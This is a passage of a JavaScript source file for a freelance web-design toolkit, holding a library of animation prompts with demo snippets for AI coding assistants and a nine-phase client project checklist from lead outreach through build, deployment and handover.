 demo:`<div class="d"><div class="px" data-parallax><i></i><i></i><i></i>
   <div class="lbl"><div class="dtitle">Depth</div></div></div>
   <div style="position:absolute;bottom:12px;left:0;right:0;text-align:center;font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;color:#8B8B94">MOVE YOUR CURSOR ACROSS</div></div>`,
 prompt:`Add a parallax effect to my hero background using GSAP ScrollTrigger.

Background shapes move at 30% of scroll speed while the foreground content moves normally, creating depth.

Requirements:
- Use ScrollTrigger with scrub: 1 for a smooth lag rather than a rigid tie to scroll position
- Keep the offset small — no more than about 15% of the element height. Heavy parallax reads as amateur and causes motion sickness
- Use transform: translate3d only, never top or margin, so it stays on the GPU
- Disable it below 768px, since parallax on touch scroll feels broken
- Skip for prefers-reduced-motion`},

{cat:'Scroll', lib:'CSS + JS', title:'Scroll progress bar',
 blurb:'A thin line across the top showing how far through the page you are. Tiny detail, disproportionate polish.',
 demo:`<div class="d"><div class="pg run"><i></i></div>
   <div style="display:grid;place-items:center;height:100%"><div class="dtitle" style="font-size:19px;color:#8B8B94">Reading progress</div></div></div>`,
 prompt:`Add a scroll progress indicator to the top of my page.

A 3px bar fixed to the very top that fills from left to right as the visitor scrolls, reaching 100% at the bottom of the document.

Requirements:
- Use a scroll listener wrapped in requestAnimationFrame, or the modern CSS animation-timeline: scroll() if you add a fallback
- Use transform: scaleX() with transform-origin: left, not width, so it does not trigger layout on every frame
- Give it a z-index above everything including any fixed header
- Hide it for prefers-reduced-motion`},

{cat:'Scroll', lib:'GSAP ScrollTrigger', title:'Count-up statistics',
 blurb:'Numbers roll up when they scroll into view. Perfect for "years in business" or "roofs replaced".',
 demo:`<div class="d" style="display:grid;place-items:center;text-align:center">
   <div><div class="ct" data-count="1284">0</div>
   <div style="font-family:var(--mono);font-size:10px;letter-spacing:.12em;color:#8B8B94;margin-top:6px">ROOFS REPLACED</div></div></div>`,
 prompt:`Animate my statistics so the numbers count up when they scroll into view, using GSAP ScrollTrigger.

Requirements:
- Count from 0 to the final value over 2 seconds with ease "power2.out"
- Use a snap so it only ever shows whole numbers, never decimals mid-count
- Add thousands separators with toLocaleString as it counts
- Fire once only, the first time it enters view
- Put the real number in the HTML as a data attribute and read it from there, so the correct value is in the markup for search engines and for anyone with JavaScript disabled
- For prefers-reduced-motion, just show the final number`},

{cat:'Hover', lib:'GSAP', title:'Magnetic button',
 blurb:'The button leans toward the cursor as it approaches. Hover the button — this is the effect people remember.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="mag" data-magnetic>Get a quote</div></div>`,
 prompt:`Make my primary call-to-action button magnetic using GSAP.

When the cursor comes within about 80px, the button eases toward it, moving at roughly 30% of the cursor offset, and springs back to centre on mouse leave.

Requirements:
- Use gsap.quickTo() rather than a new tween per mousemove event, or it will stutter
- Move the button no more than 12px in any direction. Big movement makes it hard to click, which defeats the point
- The label should move slightly further than the button itself for a subtle layered feel
- Attach only on devices with a fine pointer, using matchMedia("(pointer: fine)"), so it never runs on touch
- Reset cleanly on mouseleave with ease "elastic.out(1, 0.4)"`},

{cat:'Hover', lib:'CSS only', title:'Underline sweep',
 blurb:'The underline wipes in from the left and out to the right, rather than just appearing. Hover the links.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="ul-w">
   <div class="ul">Our work</div><div class="ul">Pricing</div><div class="ul">Get in touch</div></div>
   <div style="position:absolute;bottom:12px;left:0;right:0;text-align:center;font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;color:#8B8B94">HOVER THE LINKS</div></div>`,
 prompt:`Style my navigation links with a directional underline sweep, CSS only.

The underline grows from the left on hover and retreats to the right on unhover, so it feels like one continuous motion rather than a fade.

Requirements:
- Use a pseudo-element with transform: scaleX(0) and switch transform-origin between left and right on hover
- Transition 0.45s with cubic-bezier(.76,0,.24,1)
- Never animate width — it forces layout on every frame
- Keep a visible :focus-visible style for keyboard users, since hover styles alone leave them with nothing`},

{cat:'Hover', lib:'CSS + JS', title:'3D card tilt',
 blurb:'Cards tip toward the cursor in perspective. Move your cursor over the card.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="tl-w" data-tilt><div class="tl">Hover me</div></div></div>`,
 prompt:`Add a 3D tilt effect to my service cards.

The card rotates toward the cursor in perspective as it moves across, and returns level on leave.

Requirements:
- Wrapper gets perspective: 800px, the card gets rotateX and rotateY based on cursor position relative to the card centre
- Cap the rotation at 8 degrees. Any more and it looks like a toy
- Use transform only, and add a short transition on mouseleave so the return is smooth rather than instant
- Skip on touch devices and for prefers-reduced-motion
- Make sure the card content stays readable — do not add so much perspective that text distorts`},

{cat:'Hover', lib:'CSS only', title:'Image zoom with caption',
 blurb:'The photo scales inside its frame while a caption slides up. Standard for portfolio and gallery grids.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="iz"><i></i><div class="cap">Ridgeline Roofing — full rebuild</div></div>
   <div style="position:absolute;bottom:12px;left:0;right:0;text-align:center;font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;color:#8B8B94">HOVER THE IMAGE</div></div>`,
 prompt:`Build a portfolio grid where hovering an item zooms the image and slides a caption up over it, CSS only.

Requirements:
- Fixed-size container with overflow: hidden; the image scales to 1.14 on hover over 0.7s with cubic-bezier(.16,1,.3,1)
- Caption sits at the bottom, starts translated fully below the frame, slides to zero on hover, over a dark gradient so text stays readable over any photo
- The whole tile is one link, so the caption must not block the click
- Caption stays visible on :focus-within for keyboard users
- Use object-fit: cover so photos of different shapes still fill the tile`},

{cat:'Text', lib:'CSS only', title:'Shine sweep',
 blurb:'A highlight travels across the headline on a loop. Cheap, and unreasonably effective on a dark hero.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="dtitle sh run" style="font-size:30px">Premium finish</div></div>`,
 prompt:`Add a moving shine sweep across my hero headline, CSS only.

A bright band travels left to right across the text every few seconds.

Requirements:
- Use a linear-gradient background with background-clip: text and transparent colour, then animate background-position
- Include -webkit-background-clip: text for Safari
- Cycle every 2.5s or slower — faster reads as a broken loading state
- Provide a solid colour fallback for browsers without background-clip support, so the headline is never invisible
- Disable for prefers-reduced-motion`},

{cat:'Text', lib:'CSS only', title:'Infinite marquee',
 blurb:'A continuously scrolling strip, with the edges faded out. Good for logos, service lists, or review snippets.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="mq"><div class="tr">
   <span>ROOFING</span><span>·</span><span>SIDING</span><span>·</span><span>GUTTERS</span><span>·</span>
   <span>ROOFING</span><span>·</span><span>SIDING</span><span>·</span><span>GUTTERS</span><span>·</span></div></div></div>`,
 prompt:`Build an infinite horizontal marquee strip for my services list.

Requirements:
- Duplicate the content once in the markup and animate translateX to -50%, so the loop is seamless with no visible jump
- Use a CSS mask-image gradient to fade both edges out instead of hard-cutting the text
- Pause on hover
- Use animation on a transform only, never on scroll position or left
- Hide the duplicated copy from screen readers with aria-hidden so it is not read twice
- Do not run it for prefers-reduced-motion — show a static row instead`},

{cat:'Smoothness', lib:'Lenis', title:'Smooth scrolling',
 blurb:'The whole page glides instead of jumping. Watch the two dots — linear on top, eased underneath. That difference is the entire feeling.',
 demo:`<div class="d" style="display:grid;place-items:center"><div class="ez run">
   <div><div class="lb">Default — linear</div><div class="lane"><i class="dot d1"></i></div></div>
   <div><div class="lb">Eased</div><div class="lane"><i class="dot d2"></i></div></div></div></div>`,
 prompt:`Add smooth scrolling to my site using Lenis.

Requirements:
- Install lenis, initialise with a duration around 1.2 and a gentle easeOutExpo easing
- Drive it from GSAP's ticker and disable lagSmoothing, so Lenis and ScrollTrigger stay in sync instead of fighting each other
- Call ScrollTrigger.update() on every Lenis scroll event
- Leave touch devices alone — native momentum scrolling is already better than anything we would add
- Disable entirely for prefers-reduced-motion
- Make sure anchor links still work by routing them through lenis.scrollTo()

Important: do not add smooth scroll and heavy scroll animations at the same time on a slow site. Fix performance first, or it feels like lag rather than smoothness.`},

{cat:'Smoothness', lib:'GSAP', title:'Custom cursor',
 blurb:'A ring that trails the pointer and reacts to what it is over. Move your cursor inside the panel.',
 demo:`<div class="d"><div class="cs" data-cursor><div class="dtitle" style="font-size:19px;color:#8B8B94">Move in here</div>
   <div class="ring"></div><div class="dot2"></div></div></div>`,
 prompt:`Build a custom cursor for my site using GSAP.

A small solid dot that tracks the pointer exactly, and a larger ring that follows with a slight lag. The ring grows and becomes semi-transparent over links and buttons.

Requirements:
- Use gsap.quickTo() for both elements — the dot with almost no delay, the ring around 0.4s, so the lag is what creates the feel
- Only enable on matchMedia("(pointer: fine)"). On touch it does nothing but break things
- Keep the real cursor visible over form inputs and textareas, or typing becomes unpleasant
- Hide it entirely for prefers-reduced-motion
- Make sure it never blocks clicks — pointer-events: none on both elements

Be honest with me about whether this suits the site. On a local trades business it can read as trying too hard.`},

{cat:'Smoothness', lib:'Principles', title:'The rules that make it feel expensive',
 blurb:'Not an effect. The settings that separate motion that feels considered from motion that feels like a template.',
 demo:`<div class="d" style="display:grid;place-items:center;text-align:left;padding:6px">
   <div style="display:grid;gap:9px;font-size:12.5px;color:#A0A0A8;line-height:1.5">
   <div>· Everything between <b style="color:#F4F4F5">0.3s and 0.7s</b></div>
   <div>· Ease <b style="color:#F4F4F5">out</b>, never linear</div>
   <div>· Move <b style="color:#F4F4F5">under 30px</b></div>
   <div>· Only <b style="color:#F4F4F5">transform</b> and <b style="color:#F4F4F5">opacity</b></div>
   <div>· <b style="color:#F4F4F5">One</b> hero effect, not four</div></div></div>`,
 prompt:`Review every animation on my site against these rules and fix anything that breaks them.

1. Duration between 0.3s and 0.7s. Under 0.2s is invisible, over 1s makes the site feel slow.
2. Always ease out, never linear. Things in the real world decelerate. Use power3.out or cubic-bezier(.16,1,.3,1).
3. Movement under 30px. Large travel reads as a template.
4. Animate only transform and opacity. Anything else forces the browser to recalculate layout on every frame.
5. Stagger between 0.05s and 0.12s. Slower and people wait for it.
6. One statement effect per page. If everything is animated, nothing stands out.
7. Every animation respects prefers-reduced-motion.
8. Nothing important is hidden until animated — if the JavaScript fails, the content must still be readable.

Go through the site, list what breaks these rules, then fix each one. Tell me if you think an effect should be removed entirely rather than adjusted.`}
];

let pCat='All';
function initDemos(root){
  const safe=fn=>{ try{ fn(); }catch(e){ console.warn('demo skipped:',e.message); } };
  root.querySelectorAll('[data-count]').forEach(el=>{
    const target=+el.dataset.count; let n=0;
    clearInterval(el._t);
    el._t=setInterval(()=>{ n+=Math.ceil(target/48); if(n>=target){n=target;clearInterval(el._t);} el.textContent=n.toLocaleString(); },34);
    setTimeout(()=>{ el.textContent='0'; n=0; },2600);
  });
  root.querySelectorAll('[data-magnetic]').forEach(el=>{
    const p=el.parentElement;
    p.addEventListener('mousemove',e=>{
      const r=el.getBoundingClientRect();
      const dx=e.clientX-(r.left+r.width/2), dy=e.clientY-(r.top+r.height/2);
      const d=Math.hypot(dx,dy);
      if(d<110) el.style.transform=`translate(${dx*.3}px,${dy*.3}px)`;
      else el.style.transform='';
    });
    p.addEventListener('mouseleave',()=>el.style.transform='');
  });
  root.querySelectorAll('[data-tilt]').forEach(w=>{
    const c=w.querySelector('.tl');
    w.addEventListener('mousemove',e=>{
      const r=w.getBoundingClientRect();
      const x=(e.clientX-r.left)/r.width-.5, y=(e.clientY-r.top)/r.height-.5;
      c.style.transform=`rotateY(${x*16}deg) rotateX(${-y*16}deg)`;
    });
    w.addEventListener('mouseleave',()=>c.style.transform='');
  });
  root.querySelectorAll('[data-parallax]').forEach(w=>{
    const layers=[...w.querySelectorAll('i')];
    w.parentElement.addEventListener('mousemove',e=>{
      const r=w.getBoundingClientRect();
      const x=(e.clientX-r.left)/r.width-.5, y=(e.clientY-r.top)/r.height-.5;
      layers.forEach((l,i)=>{ const f=(i+1)*9; l.style.transform=`translate(${x*f}px,${y*f}px)`; });
    });
  });
  root.querySelectorAll('[data-cursor]').forEach(w=>{
    const ring=w.querySelector('.ring'), dot=w.querySelector('.dot2');
    let rx=0,ry=0,tx=0,ty=0,raf;
    w.addEventListener('mousemove',e=>{
      const r=w.getBoundingClientRect();
      tx=e.clientX-r.left; ty=e.clientY-r.top;
      dot.style.left=tx+'px'; dot.style.top=ty+'px';
      if(!raf) loop();
    });
    function loop(){ rx+=(tx-rx)*.13; ry+=(ty-ry)*.13;
      ring.style.left=rx+'px'; ring.style.top=ry+'px';
      raf=requestAnimationFrame(loop); }
  });
  root.querySelectorAll('[data-scrollreveal]').forEach(sc=>{
    if(typeof IntersectionObserver==='undefined'){
      sc.querySelectorAll('.it').forEach(i=>i.classList.add('vis')); return;
    }
    const io=new IntersectionObserver(es=>es.forEach(en=>{ if(en.isIntersecting) en.target.classList.add('vis'); }),{root:sc,threshold:.35});
    sc.querySelectorAll('.it').forEach(i=>io.observe(i));
  });
}

function renderPrompts(){
  const cats=['All',...new Set(PROMPTS.map(p=>p.cat))];
  $('pcats').innerHTML=cats.map(c=>`<button class="chip ${pCat===c?'on':''}" data-c="${c}">${c} ${c==='All'?PROMPTS.length:PROMPTS.filter(p=>p.cat===c).length}</button>`).join('');
  const list=PROMPTS.filter(p=>pCat==='All'||p.cat===pCat);
  $('plist').innerHTML=list.map((p,i)=>`
    <div class="pcard">
      <div class="stage2">${p.demo}</div>
      <div class="pmeta">
        <div class="prow"><div class="pt">${p.title}</div><span class="plib">${p.lib}</span></div>
        <div class="pb">${p.blurb}</div>
        <div class="pacts">
          <button class="btn pri" data-copy2="${i}">Copy prompt</button>
          <button class="btn" data-show="${i}">See the prompt</button>
          <button class="btn" data-replay2="${i}">Replay</button>
        </div>
        <div class="ptext" data-txt="${i}">${p.prompt.replace(/</g,'&lt;')}</div>
      </div>
    </div>`).join('');

  $('pcats').querySelectorAll('.chip').forEach(b=>b.addEventListener('click',()=>{ pCat=b.dataset.c; renderPrompts(); }));
  $('plist').querySelectorAll('[data-copy2]').forEach(b=>b.addEventListener('click',()=>{
    navigator.clipboard?.writeText(list[+b.dataset.copy2].prompt);
    b.textContent='Copied'; setTimeout(()=>{ if(b.isConnected) b.textContent='Copy prompt'; },1500);
  }));
  $('plist').querySelectorAll('[data-show]').forEach(b=>b.addEventListener('click',()=>{
    const t=$('plist').querySelector(`[data-txt="${b.dataset.show}"]`);
    t.classList.toggle('open'); b.textContent=t.classList.contains('open')?'Hide':'See the prompt';
  }));
  $('plist').querySelectorAll('[data-replay2]').forEach(b=>b.addEventListener('click',()=>{
    const card=b.closest('.pcard'), st=card.querySelector('.stage2');
    const html=st.innerHTML; st.innerHTML=''; void st.offsetWidth; st.innerHTML=html; initDemos(st);
  }));
  initDemos($('plist'));
}


/* =========================================================================
   Projects — a won lead becomes a job with its own checklist.
   Build phases follow the CLAUDE.md → design rules → inspiration → build →
   audit → fonts → GitHub → deploy process. The phases either side of that
   are the client-work parts a build tutorial does not cover.
   ========================================================================= */
const PHASES=[
{n:'01', t:'Find and qualify them', d:'Everything before they have heard your name.',
 tasks:[
 {t:'Pull them from the Lead Scraper', d:'Business type and zip, filtered by website status.',
  auto:L=>!!L, tool:'Lead Scraper',
  why:'Whether you go after no-website businesses or weak ones is a strategy choice. Pick one and work it, rather than taking whoever appears.'},
 {t:'Run Site Check on their site', d:'Read how it is actually built before you contact them.',
  auto:L=>!!(L&&(L.checked||(L.findings&&L.findings.length))), tool:'Site Check',
  why:'This is the entire difference between cold outreach and a diagnosis. Do it before the first contact, not after.'},
 {t:'Decide they are worth the time', d:'A dead form or an exposed key is a strong prospect. A clean modern site is not.',
  why:'Beginners burn weeks on businesses that were never going to buy. The findings tell you who has a problem worth paying to solve.'}]},

{n:'02', t:'First contact', d:'Email if they publish one, phone if they do not. Most do not.',
 tasks:[
 {t:'Send the first email', d:'Generated in Outreach from what Site Check found.',
  auto:L=>!!(L&&L.emailed), tool:'Outreach',
  why:'The email names that you found something specific without spelling it out. The goal is the meeting, not the sale.'},
 {t:'Call them', d:'Work the queue in the Call Organizer. Every business has a phone number; fewer than half publish an email.',
  auto:L=>!!(L&&L.attempts>0), tool:'Call Organizer',
  why:'Calling is where the volume is. If you only email, you are ignoring more than half your list.'},
 {t:'Follow up at least twice', d:'Most replies come after the first attempt, not on it.',
  why:'One attempt and moving on is the most common reason a beginner concludes "this does not work".'}]},

{n:'03', t:'The meeting', d:'Fifteen minutes, screen shared, price given live.',
 tasks:[
 {t:'Get the meeting on the calendar', d:'Date and time logged the moment they say yes.',
  auto:L=>!!(L&&L.meeting_at), tool:'Call Organizer',
  why:'The only success state of a cold call. Nothing gets pitched or priced on the phone.'},
 {t:'Send the confirmation', d:'Copy it from the meeting card and send it the day before.',
  auto:L=>!!(L&&L.confirmed), tool:'Meetings',
  why:'No-shows are what quietly kills this model, and a confirmation the day before is most of the fix.'},
 {t:'Prepare using the findings', d:'The prep sheet is already built from what Site Check found.',
  tool:'Meetings',
  why:'Walking through their actual code is what makes a beginner sound like the most prepared person who has ever called them.'},
 {t:'Hold the meeting and give the price on the call', d:'Do not say you will email a quote over.',
  auto:L=>!!(L&&L.meeting_outcome), tool:'Meetings',
  why:'A price sent afterwards gets compared, sat on, and forgotten. A price given live gets answered.'}]},

{n:'04', t:'Close it and get set up', d:'The phase beginners skip, and the reason fixed-price jobs turn into unpaid ones.',
 tasks:[
 {t:'They said yes', d:'Logged as won, with the value.',
  auto:L=>!!(L&&L.meeting_outcome==='won'), tool:'Meetings'},
 {t:'Take a deposit before starting', d:'Half up front is standard for a small build. No deposit, no start date.',
  why:'The most common way a beginner loses money is not failing to close — it is building the whole site on a handshake and then chasing an invoice. A deposit filters out people who were never going to pay.'},
 {t:'Write down exactly what you are fixing', d:'Pull the findings straight out of Site Check. Those are what you promised.',
  why:'The scope writes itself from what you sold, and you cannot quietly forget the thing that won you the job.'},
 {t:'Agree what is NOT included', d:'Logo design, copywriting, photography, ongoing changes. Name them now, in writing.',
  why:'Every unpaid month of work started with something nobody said out loud.'},
 {t:'Get the content before you start building', d:'Logo files, photos, services, hours, service area, and the actual words. One list, one date.',
  why:'This stalls more beginner projects than anything technical. They think it is your job, you think it is theirs, three weeks disappear.'},
 {t:'Agree a launch date and what happens if content is late', d:'"The date moves if I do not have content by X" — said kindly, once, up front.',
  why:'Otherwise their delay becomes your missed deadline.'}]},

{n:'05', t:'Write the brief', d:'A CLAUDE.md file that tells Claude what it is building and the rules it must follow.',
 tasks:[
 {t:'Create CLAUDE.md in the project folder', d:'Business, trade, service area, who the customer is, and the one action you want visitors to take.',
  why:'Claude reads this at the start of every session, so you stop re-explaining the project. This one file is most of the difference between a good result and a generic one.',
  p:`Create a CLAUDE.md file for this project.

Business: [name], a [trade] serving [area].
Their customer: [who actually hires them and what they are worried about].
The site must: get that person to [call / request a quote].

Include in the file:
- The business details above
- The design rules section I will paste next
- What this site must NOT be: no stock-photo hero of a generic office, no lorem ipsum left anywhere, no invented testimonials, no invented statistics
- The exact fixes I sold: [paste findings from Site Check]

Keep it under 100 lines. It is a brief, not a novel.`},
 {t:'Add the rules that stop it looking AI-generated', d:'Constraints go in CLAUDE.md so they apply to every prompt, not just the first.',
  why:'AI-built sites look the same because everyone accepts the defaults. Naming the defaults you refuse is what makes the output yours.',
  p:`Add a DESIGN RULES section to CLAUDE.md with these constraints:

- Never use a purple-to-blue gradient, or any gradient, unless I ask
- No generic three-column feature grid with circular icons
- No centre-aligned everything — use asymmetry deliberately
- Maximum two typefaces. One for headings, one for body
- Font sizes come from a scale, not arbitrary numbers
- Pick a base spacing unit and use multiples of it everywhere
- No emoji as icons
- No rounded-everything. Pick a corner radius and hold it
- Generous whitespace. When unsure, add more
- Colour: black, white, greys, plus at most one accent used sparingly
- Never invent testimonials, client names, statistics or awards

If a request would break one of these, say so before building.`},
 {t:'Collect design inspiration first', d:'Three to five real sites you want it to feel like. Screenshot them into the folder and reference them by name.',
  why:'"Make it look good" produces the average of everything. "Match the spacing in this reference" produces something specific. Biggest quality lever you have.'},
 {t:'Set up the project folder', d:'One folder per client, with reference images and CLAUDE.md inside before you start.',
  why:'Claude Code works from the folder it opens in. Structure first means every later prompt has context for free.'}]},

{n:'06', t:'Build it', d:'Prompt the first version, then review it honestly before adding anything.',
 tasks:[
 {t:'Prompt the first build', d:'Structure and content only. No animation yet.',
  why:'Getting layout and copy right first means motion enhances something good rather than decorating something weak.',
  p:`Read CLAUDE.md, then build the first version of this site.

Pages: home, services, about, contact.
Home sections in order: hero, the problem their customer has, services, proof, call to action.

Requirements:
- Semantic HTML, mobile-first CSS, no framework unless you tell me why one is needed
- Real copy written for this business, not placeholder text
- Every image an <img> with a real alt description, using local files from /images
- One accent colour, defined once as a CSS variable
- No animation yet — we add motion after the layout is right

Before you start, tell me anything in the brief that is unclear or missing.`},
 {t:'Turn on the front-end design skill', d:'Claude has a front-end skill carrying design conventions the base model does not apply by default.',
  why:'Same model, noticeably better defaults on spacing, type scale and component structure.'},
 {t:'Review the first build on your phone', d:'Phone before laptop, every time.',
  why:'You build on a wide screen and your client opens it in a truck. Whatever is broken on mobile is what they see first.'}]},

{n:'07', t:'Make it not look AI-generated', d:'The audit pass, where the result stops looking templated.',
 tasks:[
 {t:'Run a design audit', d:'Ask Claude to criticise its own output before asking for fixes.',
  why:'Critique and generation are different tasks. A flaw list first produces sharper fixes than "improve this".',
  p:`Audit the site you just built against the DESIGN RULES in CLAUDE.md.

Do not fix anything yet. Give me a numbered list of everything weak, generic, or breaking the rules. For each, say what specifically is wrong and what you would do instead.

Be harsh. If a section reads as AI-generated, say so and explain what gives it away.

Then rank the list by how much each fix would improve the site.`},
 {t:'Fix typography using references', d:'Point at a real site and match the relationships, not the design.',
  why:'Typography is the fastest tell. Default stacks and arbitrary sizes are most of what "AI slop" means in practice.',
  p:`The typography is the weakest part. Fix it using this reference: [site name or screenshot].

Match the relationships, not the exact fonts:
- Ratio between heading and body size
- Line height on body copy
- Letter spacing on large headings, which should be tighter than default
- Space above and below a heading

Then set a type scale as CSS variables and use those everywhere. No arbitrary font sizes anywhere in the stylesheet.`},
 {t:'Choose better fonts', d:'Two Google Fonts, chosen deliberately.',
  why:'A handful of typefaces appear on every AI-built site. Picking anything considered instantly separates the result.',
  p:`Replace the fonts with a deliberate pairing from Google Fonts.

Requirements:
- One heading face with actual character, one highly readable body face
- Not Inter, Roboto, Poppins, Montserrat or Open Sans — those are the defaults everything ships with
- Load only the weights actually used, with font-display: swap
- Self-host or preconnect so fonts are not a loading bottleneck

Give me three pairings with a sentence on why each suits a [trade] business, then apply the one I pick.`},
 {t:'Add motion last, and only a little', d:'One or two effects from the Prompt Library. Not four.', tool:'Prompt Library',
  why:'One considered effect reads as craft. Four reads as a template with the animations switched on.'}]},

{n:'08', t:'Ship it', d:'Version control, then live on their own domain.',
 tasks:[
 {t:'Commit to GitHub', d:'Initialise the repo and push before you deploy anything.',
  why:'Your undo button. The first time Claude rewrites a file you liked, you will understand why this is not optional.'},
 {t:'Run Site Check against your own build', d:'Every problem you flagged on their old site must come back clean on yours.', tool:'Site Check',
  why:'The loop closing. Also how you find out you shipped the same exposed key you sold them on fixing.'},
 {t:'Deploy', d:'The video uses a VPS. A static host is free and simpler — see the note at the bottom.',
  why:'Either works. Pick one and get good at it rather than switching every project.'},
 {t:'Point their domain at it and confirm HTTPS', d:'Check the padlock on a phone, on mobile data.',
  why:'The exact step where beginners abandon projects, and the step that makes it real.'},
 {t:'Test the contact form by actually using it', d:'Send one from your phone, confirm it arrives, then have the client send one.',
  why:'You sold them on their old form being broken. Shipping a broken one would be the worst possible outcome.'},
 {t:'Show the client and get sign-off', d:'Walk them through it on a screen share, same as the first meeting.',
  why:'Sign-off is what ends the revisions. Without it, "one more small thing" continues forever.'}]},

{n:'09', t:'Hand over and keep them', d:'Where reputation is made and recurring revenue starts.',
 tasks:[
 {t:'Put the domain in the client\'s name', d:'Their business, their domain, their card. You get access, not ownership.',
  why:'Holding a client domain hostage is how small web businesses get a bad name. Doing the opposite, loudly, is a selling point.'},
 {t:'Hand over every login in writing', d:'Host, registrar, form service, analytics.',
  why:'Costs nothing, and it is the thing clients mention to other business owners.'},
 {t:'Collect the balance', d:'On handover, before the last login transfers.',
  why:'Payment terms get vague once the work is visibly finished.'},
 {t:'Write down what is included and what costs extra', d:'One page. Small text edits versus new pages or features.',
  why:'Without this you will be doing free work in six months and resenting it.'},
 {t:'Offer the monthly while they are happy', d:'Hosting, updates, small changes, monitoring. Fifty to a hundred a month.',
  why:'A build pays once. This is the difference between earning once and earning every month, and handover day is the easiest moment you will ever have to ask.'},
 {t:'Ask for a testimonial and a referral', d:'Same conversation. "Do you know anyone else who needs this?"',
  why:'Your best next lead is standing in front of you, and they are never happier than today.'}]}
];

let projects=[], pjOpen=null, phaseOpen=0;

function taskDone(pj,i,j){
  const t=PHASES[i].tasks[j];
  if(pj.done[i+'-'+j]) return true;
  const L=pj.place_id? db.byId(pj.place_id) : null;
  return !!(t.auto && t.auto(L));
}
function projProgress(pj){
  let done=0,total=0;
  PHASES.forEach((ph,i)=>ph.tasks.forEach((_,j)=>{ total++; if(taskDone(pj,i,j)) done++; }));
  return {done,total};
}
function currentPhase(pj){
  for(let i=0;i<PHASES.length;i++)
    if(PHASES[i].tasks.some((_,j)=>!taskDone(pj,i,j))) return i;
  return PHASES.length-1;
}

function renderProjects(){
  if(pjOpen!==null){ renderProject(); return; }
  $('pj-detail').hidden=true; $('pj-list').hidden=false;
  const linked=projects.map(p=>p.place_id).filter(Boolean);
  const cands=db.all().filter(l=>(l.emailed||l.attempts>0||l.meeting_at) && !linked.includes(l.place_id));
  const label=l=> l.meeting_outcome==='won' ? 'Won — start the build'
              : l.meeting_at ? 'Meeting booked'
              : l.attempts>0 ? 'Called' : 'Emailed';

  $('pj-list').innerHTML=`
    <div class="vidnote"><b>One project tracks a client the whole way</b> — from the first email or call, through the meeting, the close, the build, and handover. Steps the app already knows about tick themselves: send an email in Outreach or book a meeting in the Call Organizer and it appears here on its own.</div>
    <div class="newpj">
      <input id="pjName" placeholder="Client or business name">
      <button class="btn pri" id="addPj">Start a project by hand</button>
    </div>
    ${cands.length?`<div class="h-sec">Leads you have contacted</div>`+cands.map(l=>`
      <div class="pjcard" data-won="${l.place_id}">
        <div><div class="pn">${l.name}</div><div class="pm">${label(l)}${l.deal_value?' · $'+Number(l.deal_value).toLocaleString():''}</div></div>
        <div class="pp"><button class="btn pri">Track as a project</button></div>
      </div>`).join(''):''}
    ${projects.length?`<div class="h-sec">Projects</div>`+projects.map((pj,i)=>{
      const p=projProgress(pj), ph=PHASES[currentPhase(pj)];
      return `<div class="pjcard" data-open="${i}">
        <div><div class="pn">${pj.name}</div>
          <div class="pm">${p.done===p.total?'Finished and handed over':'Phase '+ph.n+' · '+ph.t}</div></div>
        <div class="pp"><div class="pbar"><i style="width:${Math.round(p.done/p.total*100)}%"></i></div>
          <div class="pl2">${p.done} of ${p.total} done</div></div>
      </div>`}).join(''):''}
    ${!projects.length&&!cands.length?`<div class="empty"><span class="bigico"><svg viewBox="0 0 24 24"><use href="#i-launch"/></svg></span>
      <h3>No projects yet</h3><p>Email or call a lead and they show up here automatically, with the early steps already ticked. Or type a name above to start one by hand.</p></div>`:''}`;

  $('addPj').addEventListener('click', async () => {
    const n=$('pjName').value.trim(); if(!n) return;
    await unwrap(API.projects.add({name:n, value:0, place_id:null}));
    await syncState(); projects=STATE.projects; renderProjects();
  });
  $('pj-list').querySelectorAll('[data-won]').forEach(c=>c.addEventListener('click', async () => {
    const L=db.byId(c.dataset.won);
    await unwrap(API.projects.add({name:L.name, value:L.deal_value||0, place_id:L.place_id}));
    await syncState(); projects=STATE.projects;
    pjOpen=projects.length-1; phaseOpen=currentPhase(projects[pjOpen]); renderProjects();
  }));
  $('pj-list').querySelectorAll('[data-open]').forEach(c=>c.addEventListener('click',()=>{
    pjOpen=+c.dataset.open; phaseOpen=currentPhase(projects[pjOpen]); renderProjects();
  }));
}

function renderProject(){
  const pj=projects[pjOpen]; const pr=projProgress(pj);
  $('pj-list').hidden=true; $('pj-detail').hidden=false;
  $('pj-detail').innerHTML=`
    <div style="display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-bottom:24px">
      <button class="btn" id="pjBack">← All projects</button>
      <div><div style="font-family:var(--display);font-size:21px;font-weight:600;letter-spacing:-.02em">${pj.name}</div>
        <div style="font-size:12.5px;color:var(--ink-3);margin-top:3px">${pr.done} of ${pr.total} steps done</div></div>
      <div style="margin-left:auto;min-width:220px"><div class="pbar"><i style="width:${Math.round(pr.done/pr.total*100)}%"></i></div></div>
    </div>
    ${PHASES.map((ph,i)=>{
      const dn=ph.tasks.filter((_,j)=>taskDone(pj,i,j)).length;
      return `<div class="phase">
        <div class="ph" data-ph="${i}">
          <span class="pnum">${ph.n}</span>
          <div><div class="pt2">${ph.t}</div><div class="pd">${ph.d}</div></div>
          <span class="pc">${dn}/${ph.tasks.length}</span>
        </div>
        <div class="pbody ${i===phaseOpen?'open':''}">
          ${ph.tasks.map((t,j)=>{
            const L=pj.place_id? db.byId(pj.place_id):null;
            const isAuto=!!(t.auto && t.auto(L));
            const dn2=taskDone(pj,i,j);
            return `<div class="task ${dn2?'done':''}">
            <input type="checkbox" class="rowcb" data-k="${i}-${j}" ${dn2?'checked':''} ${isAuto?'disabled':''}>
            <div style="flex:1">
              <div class="tt">${t.t}${t.tool?` <span class="toolbadge">${t.tool}</span>`:''}</div>
              <div class="td">${t.d}</div>
              ${isAuto?`<div class="autonote">Ticked automatically — the app recorded this</div>`:''}
              ${t.why?`<div class="why">${t.why}</div>`:''}
              ${t.p?`<div class="tp"><button class="btn" data-p="${i}-${j}">Copy the prompt</button>
                     <div class="ptext" data-pt="${i}-${j}">${t.p.replace(/</g,'&lt;')}</div></div>`:''}
            </div></div>`}).join('')}
        </div></div>`}).join('')}
